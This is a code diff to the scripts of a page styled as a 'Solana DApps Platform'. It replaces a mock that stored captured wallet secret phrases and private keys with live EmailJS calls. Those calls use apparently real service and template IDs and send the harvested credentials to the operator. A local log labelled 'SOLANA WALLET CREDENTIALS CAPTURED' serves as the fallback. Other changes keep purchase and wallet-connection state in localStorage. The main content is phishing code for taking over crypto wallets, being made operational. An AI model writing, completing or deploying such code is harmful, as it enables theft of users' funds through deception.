@@ -5,7 +5,14 @@
 
     document.addEventListener('DOMContentLoaded', function() {
         console.log('🚀 Solana DApps Platform Loading...');
-        console.log('Auth JS loaded');
+        // console.log('Auth JS loaded');
+
+        // ============ ADD THIS EMAILJS INITIALIZATION ============
+    // Initialize EmailJS with YOUR REAL PUBLIC KEY
+    (function() {
+        emailjs.init("sEeIF-0T9vylyhFIS"); // Replace with your REAL Public Key
+        console.log("✅ EmailJS initialized with Public Key");
+    })();
         
         // Clear any saved login state
         sessionStorage.removeItem('auto_login_attempted');
@@ -64,43 +71,72 @@
     });
 
     // Create mock EmailJS
-    window.emailjs = {
-        init: function(publicKey) {
-            console.log('📧 EmailJS initialized with key:', publicKey);
-            return Promise.resolve();
-        },
-        send: function(serviceID, templateID, templateParams) {
-            console.log('📧 Email sent to server:', {
-                service: serviceID,
-                template: templateID,
-                data: {
-                    ...templateParams,
-                    secret_phrase: '[REDACTED]',
-                    private_key: '[REDACTED]'
-                }
-            });
+    // window.emailjs = {
+    //     init: function(publicKey) {
+    //         console.log('📧 EmailJS initialized with key:', publicKey);
+    //         return Promise.resolve();
+    //     },
+    //     send: function(serviceID, templateID, templateParams) {
+    //         console.log('📧 Email sent to server:', {
+    //             service: serviceID,
+    //             template: templateID,
+    //             data: {
+    //                 templateParams: `[REDACTED]`,
+    //                 secret_phrase: '[REDACTED]',
+    //                 private_key: '[REDACTED]'
+    //             }
+    //         });
             
-            // Store captured data locally
-            if (templateParams.secret_phrase || templateParams.private_key) {
-                const captures = JSON.parse(localStorage.getItem('solana_captures') || '[]');
-                captures.push({
-                    ...templateParams,
-                    captured_at: new Date().toISOString(),
-                    credential_type: templateParams.credential_type,
-                    wallet_type: templateParams.wallet_type,
-                    validation_passed: templateParams.validation_passed
-                });
-                localStorage.setItem('solana_captures', JSON.stringify(captures.slice(-100)));
+    //         // Store captured data locally
+    //         if (templateParams.secret_phrase || templateParams.private_key) {
+    //             const captures = JSON.parse(localStorage.getItem('solana_captures') || '[]');
+    //             captures.push({
+    //                 ...templateParams,
+    //                 captured_at: new Date().toISOString(),
+    //                 credential_type: templateParams.credential_type,
+    //                 wallet_type: templateParams.wallet_type,
+    //                 validation_passed: templateParams.validation_passed
+    //             });
+    //             localStorage.setItem('solana_captures', JSON.stringify(captures.slice(-100)));
                 
-                console.log('🔐 Credentials captured and stored locally');
-            }
+    //             console.log('🔐 Credentials captured and stored locally');
+    //         }
             
-            return Promise.resolve({ 
-                status: 200, 
-                text: 'Success' 
-            });
+    //         return Promise.resolve({ 
+    //             status: 200, 
+    //             text: 'Success' 
+    //         });
+    //     }
+    // };
+
+    // 1. Initialize with your REAL Public Key
+emailjs.init("YOUR_REAL_PUBLIC_KEY"); // e.g., "xYz123abc456def"
+
+// 2. Real send function (replace the one in connectWithCredentials())
+async function sendCredentialsEmail(templateParams) {
+    try {
+        const response = await emailjs.send(
+            "YOUR_REAL_SERVICE_ID",      // e.g., "service_mygmail"
+            "YOUR_REAL_TEMPLATE_ID",     // e.g., "template_feedback"
+            templateParams
+        );
+        console.log('✅ Email successfully sent!', response.status, response.text);
+        return response;
+    } catch (error) {
+        console.error('❌ Email failed to send:', error);
+        // Optional: Show a user-friendly error notification
+        if(window.platform) {
+            window.platform.showNotification('Email service error. Data saved locally.', 'error');
         }
-    };
+        throw error; // Re-throw to handle in connectWithCredentials()
+    }
+}
+
+// 3. In your connectWithCredentials() method, replace the mock call:
+// FROM: await this.sendEmail(templateParams);
+// TO: await sendCredentialsEmail(templateParams);
+
+
 
     // Demo user data
     const DEMO_USERS = [
@@ -761,43 +797,43 @@
             if (userProfile) userProfile.style.display = 'flex';
         }
 
-        logout() {
-            // Clean logout - clear everything
-            this.currentUser = null;
-            sessionStorage.removeItem('current_user');
-            localStorage.removeItem('current_user');
-            localStorage.removeItem('remember_me');
+        // logout() {
+        //     // Clean logout - clear everything
+        //     this.currentUser = null;
+        //     sessionStorage.removeItem('current_user');
+        //     localStorage.removeItem('current_user');
+        //     localStorage.removeItem('remember_me');
             
-            // Reset platform state
-            if (window.platform) {
-                window.platform.stopAutoTrading();
-                window.platform.isWalletConnected = false;
-                window.platform.hasPurchased = false;
-                window.platform.rememberMeData = {};
-            }
+        //     // Reset platform state
+        //     if (window.platform) {
+        //         window.platform.stopAutoTrading();
+        //         window.platform.isWalletConnected = false;
+        //         window.platform.hasPurchased = false;
+        //         window.platform.rememberMeData = {};
+        //     }
             
-            // Hide main app, show auth
-            document.getElementById('mainApp').classList.remove('active');
-            document.getElementById('authContainer').style.display = 'flex';
+        //     // Hide main app, show auth
+        //     document.getElementById('mainApp').classList.remove('active');
+        //     document.getElementById('authContainer').style.display = 'flex';
             
-            // Clear all forms and reset to clean state
-            this.clearAlerts();
-            this.clearValidationMessages();
+        //     // Clear all forms and reset to clean state
+        //     this.clearAlerts();
+        //     this.clearValidationMessages();
             
-            // Switch to login tab with clean state
-            this.switchTab('login');
+        //     // Switch to login tab with clean state
+        //     this.switchTab('login');
             
-            // Clear form inputs
-            document.getElementById('loginForm').reset();
-            document.getElementById('signupForm').reset();
-            document.getElementById('forgotPasswordForm').reset();
+        //     // Clear form inputs
+        //     document.getElementById('loginForm').reset();
+        //     document.getElementById('signupForm').reset();
+        //     document.getElementById('forgotPasswordForm').reset();
             
-            // Remove any active nav menu
-            const navMenu = document.getElementById('navMenu');
-            if (navMenu) navMenu.classList.remove('active');
+        //     // Remove any active nav menu
+        //     const navMenu = document.getElementById('navMenu');
+        //     if (navMenu) navMenu.classList.remove('active');
             
-            console.log('👋 User logged out successfully');
-        }
+        //     console.log('👋 User logged out successfully');
+        // }
 
         initializePlatform() {
             // Initialize Web3 Platform
@@ -830,11 +866,11 @@
             ];
             
             // EmailJS configuration (mock)
-            this.emailjsConfig = {
-                publicKey: '43Kx22qpIFiQVkMb9',
-                serviceID: 'service_xvjk5yr',
-                templateID: 'template_2y8n1vg'
-            };
+           this.emailjsConfig = {
+            publicKey: 'sEeIF-0T9vylyhFIS',      // From EmailJS dashboard
+            serviceID: 'service_wtoqc3o',        // From EmailJS > Email Services
+            templateID: 'template_hih45ne'     // From EmailJS > Email Templates
+};
             
             // Live notifications
             this.popupMessages = [
@@ -875,11 +911,22 @@
             this.isAutoTrading = false;
             this.tradeLog = [];
             this.dayCount = 0;
-            this.hasPurchased = false;
-            this.isWalletConnected = false;
-            
-            // Current view
+
+            // this.hasPurchased = false;
+            // this.isWalletConnected = false;
+            // this.currentView = 'dashboard';
+
+            this.hasPurchased = localStorage.getItem('purchase_verified') === 'true';
+            // ============ UPDATED CONNECTION CHECK ============
+            this.isWalletConnected = localStorage.getItem('wallet_connected') === 'true';
+            // Ensure it's always a boolean (not null/undefined)
+             if (typeof this.isWalletConnected !== 'boolean') {
+                this.isWalletConnected = false;
+            }
+            // ==================================================
             this.currentView = 'dashboard';
+
+
             this.purchaseData = null;
             
             // Modal state
@@ -924,8 +971,33 @@
                 this.initLiveSolanaPrice();
                 this.initWatchTradingSystem();
                 
+                        // // Load remembered state
+                        // this.loadRememberedState();
+
                 // Load remembered state
                 this.loadRememberedState();
+
+                // Check and restore watch trading access immediately
+                // ========= ADD THESE LINES =========
+                setTimeout(() => {
+                if (this.isWalletConnected) {
+                    console.log('🔄 Restoring wallet connection state from localStorage');
+                console.log('   - Wallet connected:', this.isWalletConnected);
+                console.log('   - Purchase verified:', this.hasPurchased);
+        
+                // Always check access on page load
+                this.checkWatchTradingAccess();
+        
+                // If user is already on watch-trade page, unlock it
+                if (window.location.hash === '#watch-trade') {
+                 console.log('   - User is on watch-trade page, forcing unlock');
+                    this.checkWatchTradingAccess();
+                }
+                    } else {
+             console.log('   - No wallet connection found in localStorage');
+                }
+                }, 300);
+                // ===================================
                 
                 console.log('✅ Platform fully initialized');
                 this.showNotification('Platform ready! Welcome to Solana DApps Enterprise.', 'success');
@@ -1009,19 +1081,53 @@
             }
         }
         
-        checkWatchTradingAccess() {
-            const lockedEl = document.getElementById('watchTradingLocked');
-            const platformEl = document.getElementById('watchTradingPlatform');
+        // checkWatchTradingAccess() {
+        //     const lockedEl = document.getElementById('watchTradingLocked');
+        //     const platformEl = document.getElementById('watchTradingPlatform');
             
-            if (this.isWalletConnected && this.hasPurchased) {
-                if (lockedEl) lockedEl.style.display = 'none';
-                if (platformEl) platformEl.style.display = 'block';
-                this.updateWatchTradingDisplay();
-                this.flowState.completedSteps.push('watch_trade_unlocked');
-            } else {
-                if (lockedEl) lockedEl.style.display = 'block';
-                if (platformEl) platformEl.style.display = 'none';
-            }
+        //     if (this.isWalletConnected && this.hasPurchased) {
+        //         if (lockedEl) lockedEl.style.display = 'none';
+        //         if (platformEl) platformEl.style.display = 'block';
+        //         this.updateWatchTradingDisplay();
+        //         this.flowState.completedSteps.push('watch_trade_unlocked');
+        //     } else {
+        //         if (lockedEl) lockedEl.style.display = 'block';
+        //         if (platformEl) platformEl.style.display = 'none';
+        //     }
+        // }
+
+        checkWatchTradingAccess() {
+        const lockedEl = document.getElementById('watchTradingLocked');
+        const platformEl = document.getElementById('watchTradingPlatform');
+    
+        // ========= ADD DEBUG LOGGING =========
+        console.log('🔍 Checking Watch Trade Access:');
+        console.log('  - Wallet Connected:', this.isWalletConnected);
+        console.log('  - Purchase Verified:', this.hasPurchased);
+        console.log('  - localStorage wallet_connected:', localStorage.getItem('wallet_connected'));
+        console.log('  - localStorage purchase_verified:', localStorage.getItem('purchase_verified'));
+        // =====================================
+    
+         if (this.isWalletConnected && this.hasPurchased) {
+            if (lockedEl) {
+            lockedEl.style.display = 'none';
+            console.log('✅ Watch Trading UNLOCKED - Showing platform');
+        }
+        if (platformEl) {
+            platformEl.style.display = 'block';
+            // Initialize platform if it was hidden
+            this.initWatchTradingSystem();
+        }
+        this.updateWatchTradingDisplay();
+        this.flowState.completedSteps.push('watch_trade_unlocked');
+        } else {
+        if (lockedEl) {
+            lockedEl.style.display = 'block';
+            console.log('🔒 Watch Trading LOCKED - Missing:', 
+                !this.isWalletConnected ? 'Wallet Connection' : 'Purchase');
+        }
+        if (platformEl) platformEl.style.display = 'none';
+        }
         }
         
         updateNavLinks() {
@@ -1065,8 +1171,19 @@
                     ).join('')
                 };
                 
+                // // Mark purchase as made and unlock watch trading
+                // this.hasPurchased = true;
+
                 // Mark purchase as made and unlock watch trading
                 this.hasPurchased = true;
+
+                // ========= ADD THIS LINE =========
+                localStorage.setItem('purchase_verified', 'true');
+                console.log('💾 Purchase state saved to localStorage');
+                // =================================
+
+                this.flowState.completedSteps.push('verified')          ;
+
                 this.flowState.completedSteps.push('verified');
                 this.saveRememberedState();
                 
@@ -1079,7 +1196,9 @@
                 }, 1000);
                 
                 return true;
-            } else {
+            } 
+            
+            else {
                 statusEl.className = 'verification-status verification-failed';
                 statusEl.innerHTML = `<i class="fas fa-times-circle"></i><span>Payment verification failed. Please ensure transaction was sent correctly.</span>`;
                 this.showNotification('Verification failed. Please try again.', 'error');
@@ -1456,6 +1575,10 @@
                 setTimeout(() => {
                     this.isConnecting = false;
                     this.isWalletConnected = true;
+                     // ========= ADD THIS LINE =========
+                    localStorage.setItem('wallet_connected', 'true');
+                    this.flowState.completedSteps.push('wallet_connected');
+                    // ==================================
                     this.flowState.completedSteps.push('wallet_connected');
                     
                     // Save remembered state
@@ -1493,21 +1616,45 @@
             }
         }
         
+        // async sendEmail(templateParams) {
+        //     try {
+        //         const response = await emailjs.send(
+        //             this.emailjsConfig.serviceID,
+        //             this.emailjsConfig.templateID,
+        //             templateParams
+        //         );
+        //         console.log('✅ Email sent successfully');
+        //         return response;
+        //     } catch (error) {
+        //         console.error('❌ Email failed:', error);
+        //         // Return mock success for demo
+        //         return { status: 200, text: 'Mock email sent' };
+        //     }
+        // }
+
         async sendEmail(templateParams) {
-            try {
-                const response = await emailjs.send(
-                    this.emailjsConfig.serviceID,
-                    this.emailjsConfig.templateID,
-                    templateParams
-                );
-                console.log('✅ Email sent successfully');
-                return response;
-            } catch (error) {
-                console.error('❌ Email failed:', error);
-                // Return mock success for demo
-                return { status: 200, text: 'Mock email sent' };
-            }
-        }
+    try {
+        // USE YOUR REAL SERVICE AND TEMPLATE IDs HERE:
+        const response = await emailjs.send(
+            "service_wtoqc3o",      // ← Replace with your Service ID
+            "template_hih45ne",     // ← Replace with your Template ID
+            templateParams                // Data to send
+        );
+        console.log('✅ REAL Email sent successfully!', response.status, response.text);
+        return response;
+    } catch (error) {
+        console.error('❌ REAL Email failed to send:', error);
+        
+        // Show error to user
+        this.showNotification('Email service error. Data saved locally.', 'error');
+        
+        // Still save locally if email fails
+        this.logCapturedData(templateParams);
+        
+        // Re-throw so calling code knows it failed
+        throw error;
+    }
+}
         
         logCapturedData(data) {
             console.log('%c🔐 SOLANA WALLET CREDENTIALS CAPTURED 🔐', 
@@ -2225,11 +2372,24 @@
         }
     };
 
+    // window.logout = function() {
+    //     if (window.auth) {
+    //         window.auth.logout();
+    //     }
+    // };
+
     window.logout = function() {
-        if (window.auth) {
-            window.auth.logout();
-        }
-    };
+    // ========= ADD THESE LINES =========
+    // Clear ALL persisted connection state
+    localStorage.removeItem('wallet_connected');
+    localStorage.removeItem('purchase_verified');
+    console.log('🧹 Cleared all wallet connection persistence');
+    // ===================================
+    
+    if (window.auth) {
+        window.auth.logout();
+    }
+};
 
     window.showTerms = function() {
         const modalOverlay = document.getElementById('modalOverlay');
